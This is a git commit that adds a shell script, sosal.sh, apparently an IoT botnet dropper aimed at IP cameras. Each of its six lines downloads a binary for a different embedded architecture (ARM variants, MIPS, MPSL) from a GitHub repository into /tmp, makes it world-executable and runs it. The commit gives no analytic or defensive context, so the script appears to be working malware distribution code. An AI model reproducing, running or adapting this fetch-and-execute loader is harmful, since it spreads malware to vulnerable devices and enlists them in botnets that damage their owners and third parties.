a84b8875e3d6cdc99f965cf7f62e637059218471
Matrix2077v2 <mariataylormzi24@gmail.com>
2025-05-23 17:27:00 +0500

    Add files via upload

---
+++ sosal.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+cd /tmp; wget https://raw.githubusercontent.com/ondirisuliuly/condi/refs/heads/main/main_arm; chmod 777 main_arm; ./main_arm ipcam.arm
+cd /tmp; wget https://raw.githubusercontent.com/ondirisuliuly/condi/refs/heads/main/main_arm5; chmod 777 main_arm5; ./main_arm5 ipcam.arm5
+cd /tmp; wget https://raw.githubusercontent.com/ondirisuliuly/condi/refs/heads/main/main_arm6; chmod 777 main_arm6; ./main_arm6 ipcam.arm6
+cd /tmp; wget https://raw.githubusercontent.com/ondirisuliuly/condi/refs/heads/main/main_arm7; chmod 777 main_arm7; ./main_arm7 ipcam.arm7
+cd /tmp; wget https://raw.githubusercontent.com/ondirisuliuly/condi/refs/heads/main/main_mips; chmod 777 main_mips; ./main_mips ipcam.mips
+cd /tmp; wget https://raw.githubusercontent.com/ondirisuliuly/condi/refs/heads/main/main_mpsl; chmod 777 main_mpsl; ./main_mpsl ipcam.mpsl
